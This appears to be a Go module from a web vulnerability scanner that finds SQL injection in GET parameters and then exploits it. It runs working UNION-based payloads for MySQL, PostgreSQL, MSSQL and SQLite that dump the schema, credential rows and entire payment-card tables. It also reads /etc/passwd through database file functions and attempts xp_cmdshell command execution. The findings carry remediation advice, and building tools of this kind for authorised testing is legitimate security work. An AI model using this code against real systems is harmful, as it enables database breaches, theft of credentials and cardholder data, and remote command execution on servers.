// Package sqli detects SQL injection (boolean-based) and, when a parameter is
// injectable, extracts real data with UNION-based payloads: DBMS, current
// database, current user, tables, columns and credential rows. It supports
// MySQL, MSSQL, PostgreSQL and SQLite, in both string and numeric injection
// contexts. All payloads are read-only.
package sqli

import (
	"encoding/hex"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

const marker = "frx7marker"

// response is the outcome of one injected request.
type response struct {
	status int
	body   string
	dump   string
}

// injContext describes how a payload breaks out of a parameter: a string
// context closes a quote, a numeric context appends directly.
type injContext struct {
	name        string
	boolTrue    string
	boolFalse   string
	unionPrefix string
	unionSuffix string
}

// The UNION prefix forces the original condition false so that only the
// injected row is returned and rendered, which makes extraction reliable on
// apps that display a single record.
var contexts = []injContext{
	{"string", "' AND '1'='1", "' AND '1'='2", "' AND '1'='2' UNION SELECT ", "-- -"},
	{"numeric", " AND 1=1", " AND 1=2", " AND 1=2 UNION SELECT ", "-- -"},
}

var sqlErrorSignature = regexp.MustCompile(`(?i)sql syntax|mysql|mariadb|postgresql|sqlite|sql server|odbc|jdbc|ora-\d+|syntax error|unclosed quotation|unterminated quoted string`)

// dbProfile holds the DBMS-specific SQL used during extraction. wrap delimits a
// scalar expression with markers using that DBMS's concatenation dialect.
type dbProfile struct {
	name        string
	versionExpr string
	dbExpr      string
	userExpr    string
	tablesExpr  string
	wrap        func(expr string) string
	columnsExpr func(table string) string
	dumpExpr    func(table string, cols []string) string

	// hexExpr wraps a scalar so it returns a hex string, used to exfiltrate
	// values when the response filters special characters.
	hexExpr func(expr string) string

	// fileReadExpr returns an expression that reads a local file, when the
	// DBMS exposes such a function. nil means file read is not attempted.
	fileReadExpr func(path string) string
}

var profiles = []dbProfile{
	{
		name:        "MySQL",
		versionExpr: "version()",
		dbExpr:      "database()",
		userExpr:    "current_user()",
		tablesExpr:  "(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())",
		wrap:        func(e string) string { return "concat('" + marker + "',(" + e + "),'" + marker + "')" },
		columnsExpr: func(t string) string {
			return "(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='" + t + "')"
		},
		dumpExpr: func(t string, cols []string) string {
			return "(SELECT group_concat(concat_ws(0x3a," + strings.Join(cols, ",") + ") SEPARATOR 0x0a) FROM " + t + ")"
		},
		hexExpr:      func(e string) string { return "hex((" + e + "))" },
		fileReadExpr: func(path string) string { return "LOAD_FILE('" + path + "')" },
	},
	{
		name:        "PostgreSQL",
		versionExpr: "version()",
		dbExpr:      "current_database()",
		userExpr:    "current_user",
		tablesExpr:  "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
		wrap:        func(e string) string { return "'" + marker + "'||(" + e + ")::text||'" + marker + "'" },
		columnsExpr: func(t string) string {
			return "(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='" + t + "')"
		},
		dumpExpr: func(t string, cols []string) string {
			return "(SELECT string_agg(concat_ws(':'," + strings.Join(cols, ",") + "),chr(10)) FROM " + t + ")"
		},
		hexExpr: func(e string) string { return "encode(convert_to((" + e + ")::text,'UTF8'),'hex')" },
	},
	{
		name:        "MSSQL",
		versionExpr: "@@version",
		dbExpr:      "db_name()",
		userExpr:    "system_user",
		tablesExpr:  "(SELECT STRING_AGG(name,',') FROM sys.tables)",
		wrap:        func(e string) string { return "'" + marker + "'+CONVERT(varchar(max),(" + e + "))+'" + marker + "'" },
		columnsExpr: func(t string) string {
			return "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('" + t + "'))"
		},
		dumpExpr: func(t string, cols []string) string {
			joined := strings.Join(cols, "+':'+")
			return "(SELECT STRING_AGG(CONVERT(varchar(max)," + joined + "),CHAR(10)) FROM " + t + ")"
		},
		hexExpr: func(e string) string { return "convert(varchar(max),convert(varbinary(max),(" + e + ")),2)" },
	},
	{
		name:        "SQLite",
		versionExpr: "sqlite_version()",
		dbExpr:      "'main'",
		userExpr:    "''",
		tablesExpr:  "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
		wrap:        func(e string) string { return "'" + marker + "'||(" + e + ")||'" + marker + "'" },
		columnsExpr: nil, // column listing needs PRAGMA, not reachable via UNION
		dumpExpr: func(t string, cols []string) string {
			return "(SELECT group_concat(" + strings.Join(cols, "||':'||") + ",char(10)) FROM " + t + ")"
		},
		hexExpr:      func(e string) string { return "hex((" + e + "))" },
		fileReadExpr: func(path string) string { return "readfile('" + path + "')" },
	},
}

// Run tests every discovered GET parameter for SQL injection.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, p := range surface.Params {
		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true

		findings = append(findings, testParam(cfg, client, p)...)
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param) []finding.Finding {
	orig := origValue(p)

	base := request(cfg, client, p, orig)
	if base == nil {
		return nil
	}

	for _, c := range contexts {
		truthy := request(cfg, client, p, orig+c.boolTrue)
		falsy := request(cfg, client, p, orig+c.boolFalse)

		if truthy == nil || falsy == nil {
			continue
		}

		if !looksInjectable(*base, *truthy, *falsy) {
			continue
		}

		return confirmed(cfg, client, p, orig, c, *truthy)
	}

	return testCustomPayloads(cfg, client, p, orig, *base)
}

func testCustomPayloads(cfg *config.Config, client *http.Client, p recon.Param, orig string, base response) []finding.Finding {
	var findings []finding.Finding

	for _, payload := range cfg.NormalizedCustomPayloads() {
		injected := orig + payload
		resp := request(cfg, client, p, injected)
		if resp == nil {
			continue
		}

		reason := customSQLiReason(base, *resp)
		if reason == "" {
			continue
		}

		findings = append(findings, finding.Finding{
			Title:       "Custom SQL injection payload produced a suspicious response in parameter '" + p.Name + "'",
			Module:      "sqli",
			Severity:    finding.Medium,
			OWASP:       "A03:2025 - Injection",
			CWE:         "CWE-89",
			CVSS:        6.5,
			Description: "A caller-supplied SQL injection payload changed the response in a way that warrants manual verification.",
			Evidence: finding.Evidence{
				Request:   resp.dump,
				Response:  trim(resp.body, 400),
				Extracted: reason + " via " + injected,
			},
			NextSteps: []string{
				"Manually verify whether the custom payload reached a SQL interpreter.",
				"Use parameterized queries / prepared statements for this parameter.",
			},
		})
	}

	return findings
}

func customSQLiReason(base, resp response) string {
	if resp.status >= 500 && resp.status != base.status {
		return "server error"
	}

	if sqlErrorSignature.MatchString(resp.body) {
		return "SQL error signature"
	}

	if similarity(base.body, resp.body) < 0.75 {
		return "large response change"
	}

	return ""
}

func confirmed(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, detected response) []finding.Finding {
	findings := []finding.Finding{{
		Title:       "SQL injection (boolean-based) in parameter '" + p.Name + "'",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "The parameter alters query logic in a " + c.name + " context: a true condition returns the baseline page while a false condition does not, confirming injectable SQL.",
		Evidence: finding.Evidence{
			Request:   detected.dump,
			Response:  trim(detected.body, 400),
			Extracted: "true: '" + orig + c.boolTrue + "' | false: '" + orig + c.boolFalse + "'",
		},
		NextSteps: []string{
			"Use parameterized queries / prepared statements for this parameter.",
			"Validate and allowlist input types before they reach the database.",
		},
	}}

	if extra := extract(cfg, client, p, orig, c); extra != nil {
		findings = append(findings, extra...)
	}

	return findings
}

// looksInjectable reports whether the true/false responses differ in the way a
// boolean-based injection produces: the true page mirrors the baseline while the
// false page diverges.
func looksInjectable(base, truthy, falsy response) bool {
	trueMatchesBase := truthy.status == base.status && similarity(base.body, truthy.body) > 0.95
	falseDiffers := falsy.status != truthy.status || similarity(truthy.body, falsy.body) < 0.95

	return trueMatchesBase && falseDiffers
}

// similarity is a cheap body-length ratio in [0,1]; 1 means identical length.
func similarity(a, b string) float64 {
	la, lb := len(a), len(b)
	if la == 0 && lb == 0 {
		return 1
	}

	max := la
	if lb > max {
		max = lb
	}

	diff := la - lb
	if diff < 0 {
		diff = -diff
	}

	return 1 - float64(diff)/float64(max)
}

// extract runs UNION-based extraction once a parameter is confirmed injectable.
func extract(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext) []finding.Finding {
	cols, pos := columnCount(cfg, client, p, orig, c)
	if cols == 0 {
		return nil
	}

	profile, version := fingerprintDBMS(cfg, client, p, orig, c, cols, pos)
	if profile == nil {
		return nil
	}

	db := readValue(cfg, client, p, orig, c, cols, pos, *profile, profile.dbExpr)
	user := readValue(cfg, client, p, orig, c, cols, pos, *profile, profile.userExpr)
	tables := readValue(cfg, client, p, orig, c, cols, pos, *profile, profile.tablesExpr)

	summary := "DBMS: " + profile.name + "\nversion: " + version +
		"\ndatabase: " + db + "\nuser: " + user + "\ntables: " + tables

	req := request(cfg, client, p, unionPayload(orig, c, cols, pos, profile.wrap(profile.versionExpr)))

	findings := []finding.Finding{{
		Title:       "SQL injection (UNION-based) data extraction confirmed",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "A UNION-based payload returned live database metadata, proving full read access to the backend database.",
		Evidence: finding.Evidence{
			Request:   req.dump,
			Response:  trim(req.body, 400),
			Extracted: summary,
		},
		NextSteps: []string{
			"Treat the database as compromised: rotate credentials and review access logs.",
			"Fix the injection with prepared statements and apply least-privilege DB accounts.",
		},
	}}

	if creds := dumpCredentials(cfg, client, p, orig, c, cols, pos, *profile, tables); creds != nil {
		findings = append(findings, *creds)
	}

	if schema := dumpSchema(cfg, client, p, orig, c, cols, pos, *profile, tables); schema != nil {
		findings = append(findings, *schema)
	}

	if cards := dumpCards(cfg, client, p, orig, c, cols, pos, *profile, tables); cards != nil {
		findings = append(findings, *cards)
	}

	if file := readFileSQLi(cfg, client, p, orig, c, cols, pos, *profile); file != nil {
		findings = append(findings, *file)
	}

	if cmd := xpCmdshell(cfg, client, p, orig, c, cols, pos, *profile); cmd != nil {
		findings = append(findings, *cmd)
	}

	return findings
}

// maxSchemaTables bounds how many tables are enumerated so a large schema does
// not blow up the tool's runtime.
const maxSchemaTables = 15

// dumpSchema enumerates every table with its columns to map the full schema.
func dumpSchema(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, tables string) *finding.Finding {
	if profile.columnsExpr == nil {
		return nil
	}

	var builder strings.Builder
	count := 0

	for _, table := range splitList(tables) {
		if count >= maxSchemaTables {
			break
		}

		columns := readValueDeep(cfg, client, p, orig, c, cols, pos, profile, profile.columnsExpr(table))
		if columns == "" {
			continue
		}

		builder.WriteString(table + ": " + columns + "\n")
		count++
	}

	if builder.Len() == 0 {
		return nil
	}

	return &finding.Finding{
		Title:       "Database schema enumerated via SQL injection",
		Module:      "sqli",
		Severity:    finding.High,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        8.6,
		Description: "UNION-based injection listed every table and its columns, revealing the full database schema available to an attacker.",
		Evidence: finding.Evidence{
			Extracted: trim(builder.String(), 2000),
		},
		NextSteps: []string{
			"Fix the injection with prepared statements and least-privilege DB accounts.",
			"Review which tables hold sensitive data and tighten access.",
		},
	}
}

// dumpCards extracts a payment-card table in full when one exists.
func dumpCards(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, tables string) *finding.Finding {
	table := pickCardTable(tables)
	if table == "" || profile.columnsExpr == nil {
		return nil
	}

	columns := splitList(readValueDeep(cfg, client, p, orig, c, cols, pos, profile, profile.columnsExpr(table)))
	if len(columns) == 0 {
		return nil
	}

	if len(columns) > 8 {
		columns = columns[:8]
	}

	dumpExpr := profile.dumpExpr(table, columns)

	dumped := readValueDeep(cfg, client, p, orig, c, cols, pos, profile, dumpExpr)
	if dumped == "" {
		return nil
	}

	return &finding.Finding{
		Title:       "Payment card data extracted from table '" + table + "' via SQL injection",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "UNION-based injection dumped a payment-card table (" + strings.Join(columns, ",") + "), exposing cardholder data.",
		Evidence: finding.Evidence{
			Extracted: trim(dumped, 2000),
		},
		NextSteps: []string{
			"Treat this as a payment-data breach and follow PCI-DSS incident response.",
			"Never store CVV; tokenize card numbers and fix the injection.",
		},
	}
}

// readFileSQLi reads /etc/passwd through the DBMS file-read primitive when one
// is available (MySQL LOAD_FILE, SQLite readfile).
func readFileSQLi(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile) *finding.Finding {
	if profile.fileReadExpr == nil {
		return nil
	}

	content := readValueDeep(cfg, client, p, orig, c, cols, pos, profile, profile.fileReadExpr("/etc/passwd"))
	if !regexp.MustCompile(`root:.*:0:0:`).MatchString(content) {
		return nil
	}

	return &finding.Finding{
		Title:       "Local file read via SQL injection",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.1,
		Description: "The database account can read local files through SQL injection, returning the contents of /etc/passwd.",
		Evidence: finding.Evidence{
			Extracted: trim(content, 2000),
		},
		NextSteps: []string{
			"Remove FILE privilege from the application database account.",
			"Fix the injection with prepared statements.",
		},
	}
}

// xpCmdshell attempts MSSQL command execution. It only reports when real command
// output is reflected, so it never produces a false positive on hardened hosts.
func xpCmdshell(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile) *finding.Finding {
	if profile.name != "MSSQL" {
		return nil
	}

	payload := orig + "'; EXEC xp_cmdshell 'whoami'-- -"

	resp := request(cfg, client, p, payload)
	if resp == nil {
		return nil
	}

	output := regexp.MustCompile(`[A-Za-z0-9.\-]+\\[A-Za-z0-9.$\-]+`).FindString(resp.body)
	if output == "" {
		return nil
	}

	return &finding.Finding{
		Title:       "OS command execution via MSSQL xp_cmdshell",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "Stacked SQL injection executed xp_cmdshell and returned command output, confirming remote command execution through the database.",
		Evidence: finding.Evidence{
			Request:   resp.dump,
			Response:  trim(resp.body, 400),
			Extracted: "whoami: " + output,
		},
		NextSteps: []string{
			"Disable xp_cmdshell and run SQL Server under a low-privilege account.",
			"Fix the injection with prepared statements.",
		},
	}
}

func pickCardTable(tables string) string {
	for _, t := range splitList(tables) {
		l := strings.ToLower(t)
		if strings.Contains(l, "card") || strings.Contains(l, "payment") || strings.Contains(l, "credit") {
			return t
		}
	}

	return ""
}

// readValueDeep reads a scalar, falling back to a hex-encoded read when the
// plain read comes back empty (the response filtered special characters).
func readValueDeep(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, expr string) string {
	if value := readValue(cfg, client, p, orig, c, cols, pos, profile, expr); value != "" {
		return value
	}

	if profile.hexExpr == nil {
		return ""
	}

	encoded := readValue(cfg, client, p, orig, c, cols, pos, profile, profile.hexExpr(expr))
	if encoded == "" {
		return ""
	}

	decoded, err := hex.DecodeString(strings.TrimSpace(encoded))
	if err != nil {
		return ""
	}

	return string(decoded)
}

// columnCount finds the number of columns and a position that reflects in the
// response, using a marker injected through UNION SELECT.
func columnCount(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext) (int, int) {
	for cols := 1; cols <= 20; cols++ {
		for pos := 0; pos < cols; pos++ {
			payload := unionPayload(orig, c, cols, pos, "'"+marker+"'")

			resp := request(cfg, client, p, payload)
			if resp != nil && strings.Contains(resp.body, marker) {
				return cols, pos
			}
		}
	}

	return 0, 0
}

func fingerprintDBMS(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int) (*dbProfile, string) {
	for i := range profiles {
		value := readValue(cfg, client, p, orig, c, cols, pos, profiles[i], profiles[i].versionExpr)
		if value != "" {
			return &profiles[i], value
		}
	}

	return nil, ""
}

// readValue extracts a single scalar by wrapping it between markers (in the
// DBMS's own dialect) so it can be sliced out of the response.
func readValue(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, expr string) string {
	resp := request(cfg, client, p, unionPayload(orig, c, cols, pos, profile.wrap(expr)))
	if resp == nil {
		return ""
	}

	return between(resp.body, marker, marker)
}

func dumpCredentials(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, tables string) *finding.Finding {
	table := pickCredentialTable(tables)
	if table == "" || profile.columnsExpr == nil {
		return nil
	}

	columns := readValue(cfg, client, p, orig, c, cols, pos, profile, profile.columnsExpr(table))
	identCol, secretCol := pickCredentialColumns(columns)

	if identCol == "" || secretCol == "" {
		return nil
	}

	dumpExpr := profile.dumpExpr(table, []string{identCol, secretCol})

	dumped := readValue(cfg, client, p, orig, c, cols, pos, profile, dumpExpr)
	if dumped == "" {
		return nil
	}

	req := request(cfg, client, p, unionPayload(orig, c, cols, pos, profile.wrap(dumpExpr)))

	return &finding.Finding{
		Title:       "Credentials extracted from table '" + table + "' via SQL injection",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "UNION-based injection dumped credential rows (" + identCol + "/" + secretCol + ") from the database.",
		Evidence: finding.Evidence{
			Request:   req.dump,
			Response:  trim(req.body, 400),
			Extracted: trim(dumped, 2000),
		},
		NextSteps: []string{
			"Rotate every exposed credential immediately.",
			"Confirm passwords are stored with a strong, salted hash (argon2/bcrypt).",
		},
	}
}

func pickCredentialTable(tables string) string {
	for _, t := range splitList(tables) {
		l := strings.ToLower(t)
		if strings.Contains(l, "user") || strings.Contains(l, "account") ||
			strings.Contains(l, "member") || strings.Contains(l, "admin") ||
			strings.Contains(l, "login") || strings.Contains(l, "credential") {
			return t
		}
	}

	return ""
}

func pickCredentialColumns(columns string) (string, string) {
	var ident, secret string

	for _, col := range splitList(columns) {
		l := strings.ToLower(col)

		if ident == "" && (strings.Contains(l, "user") || strings.Contains(l, "email") ||
			strings.Contains(l, "login") || l == "name") {
			ident = col
		}

		if secret == "" && (strings.Contains(l, "pass") || strings.Contains(l, "pwd") ||
			strings.Contains(l, "hash") || strings.Contains(l, "secret")) {
			secret = col
		}
	}

	return ident, secret
}

// unionPayload builds "<orig><prefix>NULL,...,<expr>,...,NULL<suffix>".
func unionPayload(orig string, c injContext, cols, pos int, expr string) string {
	parts := make([]string, cols)
	for i := range parts {
		if i == pos {
			parts[i] = expr
		} else {
			parts[i] = "NULL"
		}
	}

	return orig + c.unionPrefix + strings.Join(parts, ",") + c.unionSuffix
}

// origValue returns the parameter's current value, defaulting to "1".
func origValue(p recon.Param) string {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return "1"
	}

	if v := u.Query().Get(p.Name); v != "" {
		return v
	}

	return "1"
}

// request sets parameter p to value and performs a GET.
func request(cfg *config.Config, client *http.Client, p recon.Param, value string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, value)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump)}
}

func between(s, start, end string) string {
	i := strings.Index(s, start)
	if i < 0 {
		return ""
	}

	rest := s[i+len(start):]

	j := strings.Index(rest, end)
	if j < 0 {
		return ""
	}

	return rest[:j]
}

func splitList(s string) []string {
	fields := strings.FieldsFunc(s, func(r rune) bool {
		return r == ',' || r == '\n'
	})

	var out []string
	for _, f := range fields {
		f = strings.TrimSpace(f)
		if f != "" {
			out = append(out, f)
		}
	}

	return out
}

func trim(s string, max int) string {
	if len(s) > max {
		return s[:max]
	}

	return s
}
